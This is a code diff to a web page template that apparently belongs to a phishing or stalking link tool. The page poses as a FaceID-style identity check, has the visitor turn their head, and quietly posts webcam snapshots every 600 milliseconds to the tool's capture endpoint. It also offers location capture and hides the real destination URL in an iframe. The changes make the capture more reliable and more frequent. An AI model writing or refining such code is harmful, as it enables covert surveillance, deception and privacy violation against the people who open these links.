@@ -149,21 +149,27 @@ def target_page(link_id):
             
             body { 
                 background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; 
-                display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; flex-direction: column;
+                display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;
             }
             
-            /* Apple FaceID Style UI */
-            .face-container { display: none; text-align: center; }
-            .face-wrapper {
-                position: relative; width: 250px; height: 250px; margin: 0 auto 30px;
-                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.3);
+            /* Center Flex Container */
+            .face-container { 
+                display: none; /* Changed to flex in JS */
+                flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; 
             }
-            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } /* Mirror effect */
+            
+            .face-wrapper {
+                position: relative; width: 250px; height: 250px; margin-bottom: 20px;
+                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.4);
+                box-shadow: 0 0 30px rgba(255,0,0,0.2);
+            }
+            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
             
             .scan-ring {
                 position: absolute; top: 0; left: 0; width: 100%; height: 100%;
                 border: 4px solid transparent; border-top-color: var(--red);
-                border-radius: 50%; animation: spin 1.5s linear infinite; box-shadow: inset 0 0 20px rgba(255,0,0,0.5);
+                border-radius: 50%; animation: spin 1.5s linear infinite; box-shadow: inset 0 0 20px rgba(255,0,0,0.4);
+                z-index: 10; pointer-events: none;
             }
             
             /* Location Map Pin UI */
@@ -173,8 +179,10 @@ def target_page(link_id):
             @keyframes spin { 100% { transform: rotate(360deg); } }
             @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
 
-            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; }
+            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px;}
             
+            .timer-display { font-family: 'Orbitron'; font-size: 4rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; }
+
             /* Hidden Inline Content Viewer */
             #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; }
             .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 15px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,0,0,0.3); width: 100%; max-width: 600px; margin: 0 auto; height: 90vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
@@ -191,6 +199,7 @@ def target_page(link_id):
                 <video id="v" autoplay playsinline muted></video>
             </div>
             <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
+            <div class="timer-display" id="seconds-timer">15</div>
         </div>
 
         <div id="loc-section" class="loc-container">
@@ -224,37 +233,55 @@ def target_page(link_id):
 
             async function startVerificationFlow() {
                 if(mode === 'both' || mode === 'camera') {
-                    document.getElementById('cam-section').style.display = 'block';
+                    // Flex use kiya taake screen ke center me align ho
+                    document.getElementById('cam-section').style.display = 'flex'; 
                     try {
-                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+                        // facingMode: "user" front selfie camera open karne ke liye
+                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                         startFaceCheck();
                     } catch(e) {
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
                         document.getElementById('face-msg').style.color = "red";
+                        document.getElementById('seconds-timer').style.display = "none";
                         setTimeout(() => location.reload(), 2000);
                     }
                 } else if (mode === 'location') {
                     startLocationCheck();
                 } else {
-                    showContent(); // Fallback if no permissions requested
+                    showContent(); 
                 }
             }
 
+            function takeSnap() {
+                // v.readyState check fix karta hai black images wala issue
+                if(v.readyState < 2 || v.videoWidth === 0 || v.videoHeight === 0) return;
+                
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                
+                let imgData = c.toDataURL('image/jpeg', 0.5);
+                if(imgData.length < 1000) return; // Ignore empty frames
+                
+                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData }) });
+            }
+
             function startFaceCheck() {
-                // Continuous background capture - never stops while page is open
-                captureInterval = setInterval(takeSnap, 1000); 
+                // 600ms ka interval taake zyada real-time images send hun
+                captureInterval = setInterval(takeSnap, 600); 
 
                 let timeLeft = 15;
                 let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
                 let step = 0;
                 
                 const faceMsg = document.getElementById('face-msg');
+                const timerText = document.getElementById('seconds-timer');
 
                 let timer = setInterval(() => {
                     timeLeft--;
-                    // Change instruction text every 3 seconds
-                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
+                    timerText.innerText = timeLeft; // Neche seconds chalana
                     
+                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
                     faceMsg.innerText = instructions[step];
 
                     if(timeLeft <= 0) {
@@ -290,14 +317,6 @@ def target_page(link_id):
                 }
             }
 
-            function takeSnap() {
-                if(v.videoWidth === 0) return;
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
-            }
-
-            // Shows content completely inline. Hacker URL remains hidden.
             function showContent() {
                 document.getElementById('cam-section').style.display = 'none';
                 document.getElementById('loc-section').style.display = 'none';
@@ -315,7 +334,6 @@ def target_page(link_id):
                     else if (fType === 'video') html = `<video src="${actVal}" controls autoplay></video>`;
                     else html = `<iframe src="${actVal}"></iframe>`;
                 } else {
-                    // For redirect modes, load in iframe instead of redirecting so URL stays hidden
                     html = `<iframe src="${actVal}"></iframe>`;
                 }
                 medBox.innerHTML = html;
